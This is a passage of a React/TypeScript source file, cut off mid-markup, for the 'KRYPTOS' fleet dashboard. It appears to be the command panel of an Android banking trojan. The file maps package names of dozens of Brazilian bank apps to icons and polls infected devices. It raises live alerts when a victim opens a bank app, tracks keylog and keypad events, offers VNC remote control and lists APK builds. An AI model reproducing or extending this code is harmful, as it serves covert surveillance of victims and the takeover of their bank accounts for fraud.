import { useState, useEffect, useMemo, useCallback, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { devicesAPI, apkStudioAPI, authAPI, getApiBaseUrl } from '../services/api';
import type { Device } from '../types';
import { RefreshCw, Package, Bell, Volume2, VolumeX, Activity, Trash2, Smartphone, Sparkles, Download, X, User, Zap, Monitor, Wifi, Eye, EyeOff, Copy } from 'lucide-react';
import DashboardSidebar from '../components/dashboard/DashboardSidebar';
import DeviceTable from '../components/dashboard/DeviceTable';
import ContextMenu from '../components/dashboard/ContextMenu';
import QuickVNCModal from '../components/dashboard/QuickVNCModal';
import RobotAssistant from '../components/RobotAssistant';
import LanguageSelector from '../components/LanguageSelector';
import { useTranslation } from '../utils/i18n';
import { useContextMenu } from '../hooks/useContextMenu';
import { mapDeviceToCliente } from '../utils/mapDeviceToCliente';
import type { Cliente } from '../types/dashboard';
// ===== ÍCONES DE BANCO BASEADOS EM MARCA =====
const BANK_BRAND_MAP: Record<string, { bg: string; text: string; label: string; emoji?: string }> = {
  'com.nu.production':        { bg: 'linear-gradient(135deg,#820ad1,#99005b)', text: '#fff', label: 'NU' },
  'com.nubank':               { bg: 'linear-gradient(135deg,#820ad1,#99005b)', text: '#fff', label: 'NU' },
  'br.com.bradesco':          { bg: 'linear-gradient(135deg,#cc0000,#8b0000)', text: '#fff', label: 'BD' },
  'coe.bradesco':             { bg: 'linear-gradient(135deg,#cc0000,#8b0000)', text: '#fff', label: 'BD' },
  'com.bradesco':             { bg: 'linear-gradient(135deg,#cc0000,#8b0000)', text: '#fff', label: 'BD' },
  'br.com.itau':              { bg: 'linear-gradient(135deg,#ec7000,#c25a00)', text: '#fff', label: 'IT' },
  'com.itau':                 { bg: 'linear-gradient(135deg,#ec7000,#c25a00)', text: '#fff', label: 'IT' },
  'br.com.bb.android':        { bg: 'linear-gradient(135deg,#ffcc00,#e6b800)', text: '#663300', label: 'BB' },
  'com.bb.android':           { bg: 'linear-gradient(135deg,#ffcc00,#e6b800)', text: '#663300', label: 'BB' },
  'com.santander.app':        { bg: 'linear-gradient(135deg,#ec0000,#a30000)', text: '#fff', label: 'SAN' },
  'br.com.santander':         { bg: 'linear-gradient(135deg,#ec0000,#a30000)', text: '#fff', label: 'SAN' },
  'br.com.bancointer':        { bg: 'linear-gradient(135deg,#ff7a00,#e06900)', text: '#fff', label: 'INT' },
  'br.com.intermedium':       { bg: 'linear-gradient(135deg,#ff7a00,#e06900)', text: '#fff', label: 'INT' },
  'br.com.caixa':             { bg: 'linear-gradient(135deg,#a90000,#703d00)', text: '#fff', label: 'CEF' },
  'br.gov.caixa':             { bg: 'linear-gradient(135deg,#a90000,#703d00)', text: '#fff', label: 'CEF' },
  'br.com.c6bank':            { bg: 'linear-gradient(135deg,#242424,#000)', text: '#ffd700', label: 'C6' },
  'br.com.neon':              { bg: 'linear-gradient(135deg,#ffbf00,#aa8000)', text: '#fff', label: 'NEO' },
  'br.com.pagbank':           { bg: 'linear-gradient(135deg,#03a64a,#027a35)', text: '#fff', label: 'PAG' },
  'br.com.uol.ps.myaccount':  { bg: 'linear-gradient(135deg,#03a64a,#027a35)', text: '#fff', label: 'PAG' },
  'com.pagseguro':            { bg: 'linear-gradient(135deg,#03a64a,#027a35)', text: '#fff', label: 'PAG' },
  'com.mercadopago':          { bg: 'linear-gradient(135deg,#e39e00,#b67700)', text: '#fff', label: 'MP' },
  'br.com.picpay':            { bg: 'linear-gradient(135deg,#11c76f,#0aa05a)', text: '#fff', label: 'PIC' },
  'com.picpay':               { bg: 'linear-gradient(135deg,#11c76f,#0aa05a)', text: '#fff', label: 'PIC' },
  'com.panapp':               { bg: 'linear-gradient(135deg,#8b3f1b,#6a2b12)', text: '#fff', label: 'PAN' },
  'br.com.sicredi':           { bg: 'linear-gradient(135deg,#009933,#006622)', text: '#fff', label: 'SIC' },
  'br.com.original':          { bg: 'linear-gradient(135deg,#d8b400,#c79600)', text: '#fff', label: 'ORI' },
  'br.com.stone':             { bg: 'linear-gradient(135deg,#00af83,#008f6b)', text: '#fff', label: 'STN' },
  'br.com.digio':             { bg: 'linear-gradient(135deg,#ff2f7b,#d41f5c)', text: '#fff', label: 'DIG' },
  'com.will.bank':            { bg: 'linear-gradient(135deg,#ad0d6a,#82004b)', text: '#fff', label: 'WIL' },
  'br.com.agibank':           { bg: 'linear-gradient(135deg,#ff4500,#cc3700)', text: '#fff', label: 'AGI' },
  'br.com.sofisa':            { bg: 'linear-gradient(135deg,#c06515,#a1470d)', text: '#fff', label: 'SOF' },
  'com.citibank.mobile.br':   { bg: 'linear-gradient(135deg,#873000,#5c1f00)', text: '#fff', label: 'CITI' },
  'br.com.banrisul':          { bg: 'linear-gradient(135deg,#aa5b00,#783d00)', text: '#fff', label: 'BNR' },
  'br.com.sicoob':            { bg: 'linear-gradient(135deg,#005951,#003e38)', text: '#fff', label: 'SCB' },
  'com.sicoob':               { bg: 'linear-gradient(135deg,#005951,#003e38)', text: '#fff', label: 'SCB' },
  'com.btg.pactual.banking':  { bg: 'linear-gradient(135deg,#380f04,#150503)', text: '#d4af37', label: 'BTG' },
  'com.btg.pactual.investimentos': { bg: 'linear-gradient(135deg,#380f04,#150503)', text: '#d4af37', label: 'BTG' },
  'com.rico.rico':            { bg: 'linear-gradient(135deg,#ff4500,#cc3700)', text: '#fff', label: 'RCO' },
  'br.com.clear':             { bg: 'linear-gradient(135deg,#1f1f1f,#000)', text: '#00ff00', label: 'CLR' },
  'us.avenue':                { bg: 'linear-gradient(135deg,#7f1d1d,#450a0a)', text: '#fff', label: 'AVE' },
  'com.nomadglobal':          { bg: 'linear-gradient(135deg,#10b981,#064e3b)', text: '#fff', label: 'NOM' },
  'br.com.mercantildobrasil': { bg: 'linear-gradient(135deg,#993300,#662200)', text: '#fff', label: 'MCB' },
  'br.com.superdigital':      { bg: 'linear-gradient(135deg,#dc2626,#7f1d1d)', text: '#fff', label: 'SUP' },
  'com.genialinvestimentos':  { bg: 'linear-gradient(135deg,#dc2626,#450a0a)', text: '#fff', label: 'GEN' },
  'br.com.bancobari':         { bg: 'linear-gradient(135deg,#ed3a7c,#951d4c)', text: '#fff', label: 'BAR' },
  'br.com.pine':              { bg: 'linear-gradient(135deg,#b91c1c,#991b1b)', text: '#fff', label: 'PNE' },
  'br.com.bmg.android':       { bg: 'linear-gradient(135deg,#ea580c,#7c2d12)', text: '#fff', label: 'BMG' },
  'br.com.bancovotorantim':   { bg: 'linear-gradient(135deg,#991b1b,#7f1d1d)', text: '#fff', label: 'BV' },
  'br.com.bs2.banco':         { bg: 'linear-gradient(135deg,#dc2626,#7f1d1d)', text: '#fff', label: 'BS2' },
  'br.com.next':              { bg: 'linear-gradient(135deg,#00ff5f,#009933)', text: '#000', label: 'NXT' },
  'br.com.safra':             { bg: 'linear-gradient(135deg,#854d0e,#422006)', text: '#fff', label: 'SFR' },
};
function getBankBrand(pkg: string) {
  if (!pkg) return { bg: 'linear-gradient(135deg,#5f3a1e,#401105)', text: '#ffa3a3', label: '' };
  const pkgLower = pkg.toLowerCase();
  if (BANK_BRAND_MAP[pkgLower]) return BANK_BRAND_MAP[pkgLower];
  for (const key of Object.keys(BANK_BRAND_MAP)) {
    if (pkgLower.startsWith(key)) return BANK_BRAND_MAP[key];
  }
  if (pkgLower.includes('nubank') || pkgLower.includes('nu.production')) return BANK_BRAND_MAP['com.nu.production'];
  if (pkgLower.includes('bradesco')) return BANK_BRAND_MAP['br.com.bradesco'];
  if (pkgLower.includes('itau')) return BANK_BRAND_MAP['br.com.itau'];
  if (pkgLower.includes('bb.android') || pkgLower.includes('bancodobrasil')) return BANK_BRAND_MAP['br.com.bb.android'];
  if (pkgLower.includes('santander')) return BANK_BRAND_MAP['com.santander.app'];
  if (pkgLower.includes('inter') || pkgLower.includes('intermedium')) return BANK_BRAND_MAP['br.com.bancointer'];
  if (pkgLower.includes('caixa')) return BANK_BRAND_MAP['br.com.caixa'];
  if (pkgLower.includes('c6bank')) return BANK_BRAND_MAP['br.com.c6bank'];
  if (pkgLower.includes('neon')) return BANK_BRAND_MAP['br.com.neon'];
  if (pkgLower.includes('pagbank') || pkgLower.includes('pagseguro') || pkgLower.includes('myaccount')) return BANK_BRAND_MAP['br.com.pagbank'];
  if (pkgLower.includes('mercadopago')) return BANK_BRAND_MAP['com.mercadopago'];
  if (pkgLower.includes('picpay')) return BANK_BRAND_MAP['br.com.picpay'];
  if (pkgLower.includes('panapp') || pkgLower.includes('pan.card')) return BANK_BRAND_MAP['com.panapp'];
  if (pkgLower.includes('sicredi')) return BANK_BRAND_MAP['br.com.sicredi'];
  if (pkgLower.includes('stone')) return BANK_BRAND_MAP['br.com.stone'];
  if (pkgLower.includes('digio')) return BANK_BRAND_MAP['br.com.digio'];
  if (pkgLower.includes('willbank')) return BANK_BRAND_MAP['com.will.bank'];
  if (pkgLower.includes('agibank')) return BANK_BRAND_MAP['br.com.agibank'];
  if (pkgLower.includes('sicoob')) return BANK_BRAND_MAP['br.com.sicoob'];
  if (pkgLower.includes('btg')) return BANK_BRAND_MAP['com.btg.pactual.banking'];
  if (pkgLower.includes('rico')) return BANK_BRAND_MAP['com.rico.rico'];
  if (pkgLower.includes('clear')) return BANK_BRAND_MAP['br.com.clear'];
  if (pkgLower.includes('avenue')) return BANK_BRAND_MAP['us.avenue'];
  if (pkgLower.includes('nomad')) return BANK_BRAND_MAP['com.nomadglobal'];
  if (pkgLower.includes('mercantil')) return BANK_BRAND_MAP['br.com.mercantildobrasil'];
  if (pkgLower.includes('superdigital')) return BANK_BRAND_MAP['br.com.superdigital'];
  if (pkgLower.includes('genial')) return BANK_BRAND_MAP['com.genialinvestimentos'];
  if (pkgLower.includes('bari')) return BANK_BRAND_MAP['br.com.bancobari'];
  if (pkgLower.includes('pine')) return BANK_BRAND_MAP['br.com.pine'];
  if (pkgLower.includes('bmg')) return BANK_BRAND_MAP['br.com.bmg.android'];
  if (pkgLower.includes('votorantim') || pkgLower.includes('bv')) return BANK_BRAND_MAP['br.com.bancovotorantim'];
  if (pkgLower.includes('bs2')) return BANK_BRAND_MAP['br.com.bs2.banco'];
  if (pkgLower.includes('next')) return BANK_BRAND_MAP['br.com.next'];
  if (pkgLower.includes('safra')) return BANK_BRAND_MAP['br.com.safra'];
  return { bg: 'linear-gradient(135deg,#5f3a1e,#401105)', text: '#ffa3a3', label: '' };
}
interface BankIconProps { pkg: string; iconB64?: string; name?: string; size?: number; }
function BankIcon({ pkg, iconB64, name, size = 36 }: BankIconProps) {
  const [imgError, setImgError] = useState(false);
  const brand = getBankBrand(pkg);
  const fontSize = size <= 36 ? (brand.label.length > 2 ? 9 : 11) : (brand.label.length > 2 ? 11 : 14);
  
  if (iconB64 && iconB64.length > 100 && !imgError) {
    const src = iconB64.startsWith('data:') ? iconB64 : `data:image/png;base64,${iconB64}`;
    return (
      <img
        src={src}
        alt={name || pkg}
        width={size} height={size}
        style={{ borderRadius: 8, objectFit: 'contain', flexShrink: 0 }}
        onError={() => setImgError(true)}
      />
    );
  }
  
  return (
    <div
      style={{
        width: size, height: size, borderRadius: 8,
        background: brand.bg,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        flexShrink: 0, boxShadow: '0 2px 8px rgba(0,0,0,0.4)',
        fontWeight: 900, fontSize, color: brand.text,
        letterSpacing: brand.label.length > 2 ? '0px' : '0.5px',
        fontFamily: 'Inter, system-ui, sans-serif',
        userSelect: 'none'
      }}
    >
      {brand.label}
    </div>
  );
}
interface AlertItem {
  deviceId: string;
  deviceModel: string;
  bankPackage: string;
  bankName: string;
  status: 'open' | 'closed';
  timestamp: string;
  iconB64?: string;
}
interface DashboardProps {
  onLogout: () => void;
}
interface ActivityEvent {
  id: string;
  type: 'bank_open' | 'bank_close' | 'device_online' | 'device_offline' | 'numeric_keypad' | 'keylog' | 'notification';
  deviceId: string;
  deviceModel: string;
  title: string;
  description: string;
  timestamp: string;
  bankPackage?: string;
  iconB64?: string;
}
export default function Dashboard({ onLogout }: DashboardProps) {
  const { t } = useTranslation();
  const [devices, setDevices] = useState<Device[]>([]);
  const [alerts, setAlerts] = useState<AlertItem[]>([]);
  const [toasts, setToasts] = useState<any[]>([]);
  const [activityLog, setActivityLog] = useState<ActivityEvent[]>([]);
  const [isSidebarOpen, setIsSidebarOpen] = useState(true);
      const [showCreateMenu, setShowCreateMenu] = useState(false);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [hideIps, setHideIps] = useState<boolean>(() => localStorage.getItem('hide_ips') !== 'false');
  const prevDevicesRef = useRef<Device[]>([]);
  const [serverPing, setServerPing] = useState<number>(14);
  const [initialLoading, setInitialLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const navigate = useNavigate();
  const { menu, openMenu, closeMenu } = useContextMenu();
  const hasLoadedOnce = useRef(false);
  const [builds, setBuilds] = useState<any[]>([]);
  const [buildsLoading, setBuildsLoading] = useState(true);
  const [showMyAppsModal, setShowMyAppsModal] = useState(false);
  const [quickVncDevices, setQuickVncDevices] = useState<Cliente[]>([]);

  const handleOpenVnc = useCallback((cliente: Cliente) => {
    setQuickVncDevices((prev) => {
      if (prev.some((d) => d.deviceId === cliente.deviceId)) return prev;
      return [...prev, cliente];
    });
  }, []);

  const handleRemoveVnc = useCallback((deviceId: string) => {
    setQuickVncDevices((prev) => prev.filter((d) => d.deviceId !== deviceId));
  }, []);
  // Estados do Modal de Perfil
  const [showProfileModal, setShowProfileModal] = useState(false);
  const [profileUsername, setProfileUsername] = useState('');
  const [profileEmail, setProfileEmail] = useState('');
  const [profilePassword, setProfilePassword] = useState('');
  const [profileConfirmPassword, setProfileConfirmPassword] = useState('');
  const [profileError, setProfileError] = useState('');
  const [profileSuccess, setProfileSuccess] = useState('');
  const [isSavingProfile, setIsSavingProfile] = useState(false);

  const [isMobile, setIsMobile] = useState(window.innerWidth < 640);
  const showToast = useCallback((title: string, body: string, type: 'open' | 'closed', bankPkg: string, iconB64?: string) => {
    const id = Math.random().toString(36).substring(2, 9);
    setToasts((prev) => [...prev, { id, title, body, type, bankPkg, iconB64 }]);
    
    // Auto-remove after 5 seconds
    setTimeout(() => {
      setToasts((prev) => prev.filter((t) => t.id !== id));
    }, 5000);
  }, []);
  const playAlertSound = useCallback(() => {
    if (!soundEnabled) return;
    try {
      const AudioContextClass = (window as any).AudioContext || (window as any).webkitAudioContext;
      if (!AudioContextClass) return;
      
      const audioCtx = new AudioContextClass();
      
      // Bip 1 (Glow agudo)
      const osc1 = audioCtx.createOscillator();
      const gain1 = audioCtx.createGain();
      
      osc1.type = 'sine';
      osc1.frequency.setValueAtTime(880, audioCtx.currentTime); 
      osc1.frequency.exponentialRampToValueAtTime(440, audioCtx.currentTime + 0.15); 
      
      gain1.gain.setValueAtTime(0.12, audioCtx.currentTime);
      gain1.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.25); 
      
      osc1.connect(gain1);
      gain1.connect(audioCtx.destination);
      
      osc1.start();
      osc1.stop(audioCtx.currentTime + 0.25);
      
      // Bip 2 (Eco futurista imediato)
      setTimeout(() => {
        const osc2 = audioCtx.createOscillator();
        const gain2 = audioCtx.createGain();
        osc2.type = 'sine';
        osc2.frequency.setValueAtTime(1046, audioCtx.currentTime); 
        osc2.frequency.exponentialRampToValueAtTime(523, audioCtx.currentTime + 0.15); 
        
        gain2.gain.setValueAtTime(0.12, audioCtx.currentTime);
        gain2.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.25); 
        
        osc2.connect(gain2);
        gain2.connect(audioCtx.destination);
        
        osc2.start();
        osc2.stop(audioCtx.currentTime + 0.25);
      }, 130);
      
    } catch (e) {
      console.warn("AudioContext blocked/not supported", e);
    }
  }, [soundEnabled]);
  const playConnectionSound = useCallback(() => {
    if (!soundEnabled) return;
    try {
      const AudioContextClass = (window as any).AudioContext || (window as any).webkitAudioContext;
      if (!AudioContextClass) return;
      const audioCtx = new AudioContextClass();
      
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = 'sine';
      osc.frequency.setValueAtTime(523.25, audioCtx.currentTime); 
      osc.frequency.exponentialRampToValueAtTime(783.99, audioCtx.currentTime + 0.15); 
      
      gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2); 
      
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.start();
      osc.stop(audioCtx.currentTime + 0.2);
    } catch (e) {
      console.warn(e);
    }
  }, [soundEnabled]);
  const playDisconnectionSound = useCallback(() => {
    if (!soundEnabled) return;
    try {
      const AudioContextClass = (window as any).AudioContext || (window as any).webkitAudioContext;
      if (!AudioContextClass) return;
      const audioCtx = new AudioContextClass();
      
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = 'sine';
      osc.frequency.setValueAtTime(392.00, audioCtx.currentTime); 
      osc.frequency.exponentialRampToValueAtTime(261.63, audioCtx.currentTime + 0.18); 
      
      gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.22); 
      
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.start();
      osc.stop(audioCtx.currentTime + 0.22);
    } catch (e) {
      console.warn(e);
    }
  }, [soundEnabled]);
  useEffect(() => {
    // Solicita permissão para notificações do navegador
    if ('Notification' in window && Notification.permission === 'default') {
      Notification.requestPermission();
    }
    
    const handleResize = () => setIsMobile(window.innerWidth < 640);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);
  const loadDevices = useCallback(async (silent = false) => {
    try {
      if (!silent && !hasLoadedOnce.current) {
        setInitialLoading(true);
      } else if (!silent) {
        setRefreshing(true);
      }
      const t0 = performance.now();
      const data = await devicesAPI.getAll();
      const t1 = performance.now();
      const measuredPing = Math.max(4, Math.round(t1 - t0));
      if (measuredPing < 2000) {
        setServerPing(measuredPing);
      }
      setDevices(data);
      hasLoadedOnce.current = true;
    } catch (error) {
      console.error('Erro ao carregar dispositivos:', error);
    } finally {
      if (!silent) {
        setInitialLoading(false);
        setRefreshing(false);
      }
    }
  }, []);
  useEffect(() => {
    loadDevices(false);
    const interval = setInterval(() => {
      if (!document.hidden) {
        loadDevices(true);
      }
    }, 5000);
    return () => clearInterval(interval);
  }, [loadDevices]);
  const loadBuilds = useCallback(async () => {
    try {
      setBuildsLoading(true);
      const data = await apkStudioAPI.getBuilds();
      setBuilds(data);
    } catch (error) {
      console.error('Erro ao carregar histórico de builds:', error);
    } finally {
      setBuildsLoading(false);
    }
  }, []);
  useEffect(() => {
    loadBuilds();
  }, [loadBuilds]);
  // Carrega dados do perfil atual
  const loadUserProfile = async () => {
    try {
      const data = await authAPI.me();
      setProfileUsername(data.username);
      setProfileEmail(data.email || '');
      setProfilePassword('');
      setProfileConfirmPassword('');
      setProfileError('');
      setProfileSuccess('');
    } catch (err) {
      console.error('Erro ao carregar dados do perfil:', err);
    }
  };
  // Salva dados do perfil
  const handleSaveProfile = async (e: React.FormEvent) => {
    e.preventDefault();
    setProfileError('');
    setProfileSuccess('');
    
    if (profilePassword && profilePassword !== profileConfirmPassword) {
      setProfileError('As senhas não coincidem.');
      return;
    }
    setIsSavingProfile(true);
    try {
      await authAPI.updateProfile({
        username: profileUsername,
        email: profileEmail,
        password: profilePassword || undefined
      });
      setProfileSuccess('Perfil atualizado com sucesso!');
      setProfilePassword('');
      setProfileConfirmPassword('');
    } catch (err: any) {
      setProfileError(err?.response?.data?.detail || 'Erro ao atualizar perfil.');
    } finally {
      setIsSavingProfile(false);
    }
  };

  const loadActivityFeed = useCallback(async () => {
    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${getApiBaseUrl()}/api/activity-feed`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      let serverEvents: any[] = [];
      if (response.ok) {
        const data = await response.json();
        if (Array.isArray(data)) {
          serverEvents = data;
        }
      }

      // Merge com bancos ativos em tempo real dos dispositivos online
      const liveBankEvents: ActivityEvent[] = [];
      devices.forEach(dev => {
        if (dev.is_online && dev.active_bank) {
          const modelName = `${dev.manufacturer || ''} ${dev.model || ''}`.trim().toUpperCase() || dev.device_id;
          const appName = dev.active_bank.appName || 'Banco';
          liveBankEvents.push({
            id: `active-live-${dev.device_id}`,
            type: 'bank_open',
            deviceId: dev.device_id,
            deviceModel: modelName,
            title: ` BANCO ABERTO: ${appName}`,
            description: `Acessando conta bancária agora!`,
            timestamp: new Date().toLocaleTimeString('pt-BR'),
            bankPackage: dev.active_bank.package,
            iconB64: dev.active_bank.icon
          });
        }
      });

      const combined = [...liveBankEvents, ...serverEvents];
      const seenKeys = new Set<string>();
      const uniqueBankEvents = combined.filter(e => {
        const isBankAlert = e.type === 'bank_open' || e.type === 'bank_close' || (e.title && e.title.includes('BANCO'));
        if (!isBankAlert) return false;
        const key = `${e.deviceId}-${e.type}-${e.bankPackage || ''}`;
        if (seenKeys.has(key)) return false;
        seenKeys.add(key);
        return true;
      });

      setActivityLog(uniqueBankEvents.slice(0, 50));
    } catch (err) {
      console.error('Erro ao carregar feed de atividades:', err);
    }
  }, [devices]);

  useEffect(() => {
    loadActivityFeed();
    const actInterval = setInterval(() => {
      if (!document.hidden) {
        loadActivityFeed();
      }
    }, 1000);
    return () => clearInterval(actInterval);
  }, [loadActivityFeed]);

  useEffect(() => {
    if (devices.length === 0) return;
    
    const nowStr = new Date().toLocaleTimeString('pt-BR');
    const prevDevices = prevDevicesRef.current;
    
    const newEvents: ActivityEvent[] = [];
    
    // Detect events if we have previous devices state
    const shouldNotify = prevDevices.length > 0;
    
    devices.forEach((dev) => {
      const prevDev = prevDevices.find(d => d.device_id === dev.device_id);
      const modelName = `${dev.manufacturer} ${dev.model}`.toUpperCase();
      
      // 1. Connection Event: offline -> online
      if (prevDev && !prevDev.is_online && dev.is_online) {
        newEvents.push({
          id: Math.random().toString(36).substring(2, 9),
          type: 'device_online',
          deviceId: dev.device_id,
          deviceModel: modelName,
          title: ' APARELHO CONECTADO',
          description: `Dispositivo estabeleceu conexão ativa.`,
          timestamp: nowStr
        });
        if (shouldNotify) {
          playConnectionSound();
        }
      }
      
      // 2. Connection Event: online -> offline
      if (prevDev && prevDev.is_online && !dev.is_online) {
        newEvents.push({
          id: Math.random().toString(36).substring(2, 9),
          type: 'device_offline',
          deviceId: dev.device_id,
          deviceModel: modelName,
          title: '️ APARELHO DESCONECTADO',
          description: `Aparelho perdeu conexão com o servidor.`,
          timestamp: nowStr
        });
        if (shouldNotify) {
          playDisconnectionSound();
        }
      }
      
      // 3. Bank Access Event
      if (dev.is_online && dev.active_bank) {
        const prevBank = prevDev?.active_bank;
        if (!prevBank || prevBank.package !== dev.active_bank.package) {
          const appName = dev.active_bank.appName || 'Banco';
          newEvents.push({
            id: Math.random().toString(36).substring(2, 9),
            type: 'bank_open',
            deviceId: dev.device_id,
            deviceModel: modelName,
            title: ` BANCO ABERTO: ${appName}`,
            description: `Acessando conta bancária agora!`,
            timestamp: nowStr,
            bankPackage: dev.active_bank.package,
            iconB64: dev.active_bank.icon
          });
          
          if (shouldNotify) {
            playAlertSound();
            showToast(
              " BANCO ACESSADO!",
              `${modelName} está acessando o ${appName}`,
              "open",
              dev.active_bank.package,
              dev.active_bank.icon
            );
            
            if ("Notification" in window && Notification.permission === "granted") {
              try {
                new Notification(` Banco Acessado: ${appName}`, {
                  body: `Aparelho ${modelName} abriu o aplicativo!`,
                  icon: "/gangstar-logo.svg"
                });
              } catch (e) {
                console.error("Erro ao enviar push notification:", e);
              }
            }
          }
        }
      }
      
      // 4. Bank Close Event
      if (prevDev && prevDev.active_bank && (!dev.active_bank || dev.active_bank.package !== prevDev.active_bank.package)) {
        const appName = prevDev.active_bank.appName || 'Banco';
        newEvents.push({
          id: Math.random().toString(36).substring(2, 9),
          type: 'bank_close',
          deviceId: dev.device_id,
          deviceModel: modelName,
          title: `️ BANCO FECHADO: ${appName}`,
          description: `Fechou o aplicativo bancário.`,
          timestamp: nowStr,
          bankPackage: prevDev.active_bank.package,
          iconB64: prevDev.active_bank.icon
        });
        
        if (shouldNotify) {
          showToast(
            "️ BANCO FECHADO",
            `${modelName} fechou o ${appName}`,
            "closed",
            prevDev.active_bank.package,
            prevDev.active_bank.icon
          );
          
          if ("Notification" in window && Notification.permission === "granted") {
            try {
              new Notification(`️ Banco Fechado: ${appName}`, {
                body: `Aparelho ${modelName} fechou o aplicativo.`,
                icon: "/gangstar-logo.svg"
              });
            } catch (e) {
              console.error("Erro ao enviar push notification:", e);
            }
          }
        }
      }
    });
    
    // Also check for new devices that weren't in prevDevices at all (initial load/registration)
    if (shouldNotify) {
      devices.forEach((dev) => {
        const exists = prevDevices.some(d => d.device_id === dev.device_id);
        if (!exists) {
          const modelName = `${dev.manufacturer} ${dev.model}`.toUpperCase();
          newEvents.push({
            id: Math.random().toString(36).substring(2, 9),
            type: 'device_online',
            deviceId: dev.device_id,
            deviceModel: modelName,
            title: ' NOVO APARELHO INSTALADO',
            description: `Novo dispositivo registrado no painel.`,
            timestamp: nowStr
          });
          playConnectionSound();
        }
      });
    }
    if (newEvents.length > 0) {
      const bankOpenOnlyEvents = newEvents.filter(e => e.type === 'bank_open' && (e.title ? e.title.includes('BANCO ABERTO') : true));
      if (bankOpenOnlyEvents.length > 0) {
        setActivityLog((prev) => {
          return [...bankOpenOnlyEvents, ...prev].slice(0, 50);
        });
      }
      
      const openedBankEvents = newEvents.filter(e => e.type === 'bank_open');
      const closedBankEvents = newEvents.filter(e => e.type === 'bank_close');
      
      if (openedBankEvents.length > 0 || closedBankEvents.length > 0) {
        setAlerts((prev) => {
          let updated = [...prev];
          
          const affectedDevIds = new Set([...openedBankEvents, ...closedBankEvents].map(a => a.deviceId));
          updated = updated.filter(a => !(affectedDevIds.has(a.deviceId) && a.status === 'open'));
          
          const newActions = [...openedBankEvents, ...closedBankEvents].map(e => ({
            deviceId: e.deviceId,
            deviceModel: e.deviceModel,
            bankPackage: e.bankPackage || '',
            bankName: e.title.replace(' BANCO ABERTO: ', '').replace('️ BANCO FECHADO: ', ''),
            status: (e.type === 'bank_open' ? 'open' : 'closed') as 'open' | 'closed',
            timestamp: e.timestamp,
            iconB64: e.iconB64
          }));
          
          updated = [...newActions, ...updated];
          return updated.slice(0, 6);
        });
      }
    }
    
    prevDevicesRef.current = devices;
  }, [devices, soundEnabled, playConnectionSound, playDisconnectionSound, playAlertSound, showToast]);

  const clientes = useMemo(() => {
    const mapped = devices.map((d) => mapDeviceToCliente(d, hideIps)).filter((c) => {
      const isWin = c.deviceId.startsWith('WIN-') || 
                    (c.modelName && c.modelName.toLowerCase().includes('windows')) ||
                    (c.androidVersion && c.androidVersion.toLowerCase().includes('windows'));
      return !isWin;
    });
    const online = mapped.filter((c) => c.status === 'online');
    const offline = mapped.filter((c) => c.status === 'offline');
    return [...online, ...offline];
  }, [devices, hideIps]);

  const onlineCount = clientes.filter((c) => c.status === 'online').length;
  const offlineCount = clientes.length - onlineCount;

  const handleRowClick = (cliente: Cliente) => {
    if (cliente.status === 'online') {
      navigate(`/device/${cliente.deviceId}`);
    }
  };

  const handleDeleteDevice = useCallback(async (cliente: Cliente) => {
    if (!confirm(`Deseja realmente excluir o dispositivo offline "${cliente.modelName || cliente.deviceId}"?`)) {
      return;
    }
    try {
      await devicesAPI.deleteDevice(cliente.deviceId);
      loadDevices(false);
    } catch (err: any) {
      alert("Erro ao excluir dispositivo: " + (err.response?.data?.detail || err.message));
    }
  }, [loadDevices]);

  return (
    <div className="h-screen w-screen overflow-hidden bg-transparent text-slate-100 flex safe-top safe-bottom relative">
      {/* Background ambient lighting glow */}
      <div className="absolute top-0 left-1/4 w-[600px] h-[350px] bg-[#ef4444]/18 blur-[160px] pointer-events-none rounded-full" />
      <div className="absolute top-1/3 right-10 w-[500px] h-[350px] bg-[#ef4444]/18 blur-[160px] pointer-events-none rounded-full" />

      <DashboardSidebar onLogout={onLogout} isMobile={isMobile} />

      <div className={`flex-1 flex flex-col h-full min-w-0 relative z-10 overflow-hidden ${isMobile ? 'pb-16' : ''}`}>
        {/* HEADER TOP BAR */}
        <header className="bg-[#0f0f11]/85 border-b border-[#2a2a31] px-4 sm:px-5 py-2.5 flex-shrink-0 backdrop-blur-2xl relative">
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-2.5 select-none flex-shrink-0">
              <div className="w-7 h-7 rounded-md border border-[#3a3a44] bg-[#121214] flex items-center justify-center">
                <img src="/gangstar-logo.svg?v=3" alt="Kryptos" className="w-4 h-4 object-contain" />
              </div>
              <div className="leading-none">
                <h1 className="text-[13px] font-black tracking-[0.18em] uppercase text-[#e8e8ea]">KRYPTOS</h1>
                <span className="text-[9px] font-mono uppercase tracking-[0.14em] text-[#6f6f78]">Consola de flota</span>
              </div>
            </div>

            <div className="hidden sm:flex items-center text-[11px] font-mono border border-[#2a2a31] rounded-md overflow-hidden ml-2">
              <span className="px-2.5 py-1 text-[#8b8b94] border-r border-[#2a2a31]">{t('nav.total')} <b className="text-[#e8e8ea]">{clientes.length}</b></span>
              <span className="px-2.5 py-1 text-[#ef4444] border-r border-[#2a2a31] bg-[#ef4444]/10">{onlineCount} {t('nav.online')}</span>
              <span className="px-2.5 py-1 text-[#6f6f78]">{offlineCount} {t('nav.offline')}</span>
            </div>

            <div className="flex-1" />

            <div className="flex items-center gap-1.5 flex-shrink-0">
              <button
                type="button"
                onClick={() => { const next = !hideIps; setHideIps(next); localStorage.setItem('hide_ips', String(next)); }}
